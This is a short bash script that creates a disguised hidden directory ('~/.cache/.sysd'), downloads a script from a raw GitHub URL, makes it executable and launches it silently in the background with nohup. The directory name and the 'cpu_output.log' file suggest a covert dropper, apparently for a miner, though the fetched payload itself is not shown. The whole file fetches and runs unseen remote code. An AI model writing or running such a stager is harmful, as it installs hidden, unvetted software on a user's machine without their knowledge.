#!/bin/bash

WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

wget https://raw.githubusercontent.com/dgreenawnareen/sos/refs/heads/main/sos.sh

chmod +x sos.sh

nohup ./sos.sh > cpu_output.log 2>&1 &
